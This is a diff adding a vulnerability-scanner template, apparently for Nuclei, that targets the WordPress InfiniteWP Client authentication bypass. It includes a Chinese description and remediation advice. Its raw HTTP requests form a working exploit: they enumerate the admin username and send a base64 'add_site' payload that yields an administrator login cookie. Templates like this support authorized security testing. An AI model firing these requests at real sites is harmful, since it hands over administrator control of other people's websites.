@@ -1,0 +1,66 @@
+id: wordpress-infinitewp-auth-bypass
+info:
+  name: WordPress InfiniteWP Client Authentication Bypass
+  author:
+  - l0ne1y
+  description: |-
+    WordPress Plugin InfiniteWP Client 未授权访问获取管理员权限漏洞
+    WordPress是WordPress基金会的一套使用PHP语言开发的博客平台。该平台支持在PHP和MySQL的服务器上架设个人博客网站。
+
+    WordPress InfiniteWP Client 1.9.4.4之前版本中存在安全漏洞，攻击者可利用该漏洞登录到管理员账户。
+  severity: critical
+  remediation: |-
+    官方修复方案：
+    1、建议用户到官方获取最新补丁或者最新版本程序：https://wordpress.org/plugins/iwp-client/#developers
+
+    临时修复方案：
+    1、前后端同时对用户输入信息进行校验，双重验证机制。
+    2、调用功能前验证用户是否有权限调用相关功能。
+    3、直接对象引用的加密资源ID，防止攻击者枚举ID，敏感数据特殊化处理。
+    4、采用成熟的权限管理框架，如spring security。
+    5、用户进行访问操作的凭证（如用户ID、产品号码、订单流水号等）优先采用在服务端关联session或加密后放在session中的方式获取。
+    6、必须采用表单或其他参数提交用户进行访问操作的凭证（如用户ID、产品号码、订单流水号等）时，应尽可能采用难以猜测的构造方式（增加字母及随机数字等）或采用复杂的加密算法加密后提交，应对客户端提交的凭证与会话的权限进行严格的验证，如提交的产品号码是否为隶属于登录用户的产品号码。
+    7、对管理功能模块进行严格的权限验证，如非必要建议不对互联网开放或进行网络层的访问控制。
+requests:
+- matchers:
+  - type: word
+    part: header
+    words:
+    - wordpress_logged_in
+  - type: word
+    part: body
+    words:
+    - <IWPHEADER>
+  - type: status
+    status:
+    - 200
+  extractors:
+  - name: username
+    type: regex
+    regex:
+    - Author:(?:[A-Za-z0-9 -\_="]+)?<span(?:[A-Za-z0-9 -\_="]+)?>([A-Za-z0-9]+)<\/span>
+    group: 1
+    part: body
+    internal: true
+  - name: username
+    type: regex
+    regex:
+    - 'ion: https:\/\/[a-z0-9.]+\/author\/([a-z]+)\/'
+    group: 1
+    part: header
+    internal: true
+  matchers-condition: and
+  raw:
+  - |
+    GET /?author=1 HTTP/1.1
+    Host: {{Hostname}}
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+    Accept-Language: en-US,en;q=0.9
+  - |
+    POST / HTTP/1.1
+    Host: {{Hostname}}
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    Content-Type: application/x-www-form-urlencoded
+
+    _IWP_JSON_PREFIX_{{base64("{\"iwp_action\":\"add_site\",\"params\":{\"username\":\"{{username}}\"}}")}}
+  redirects: true
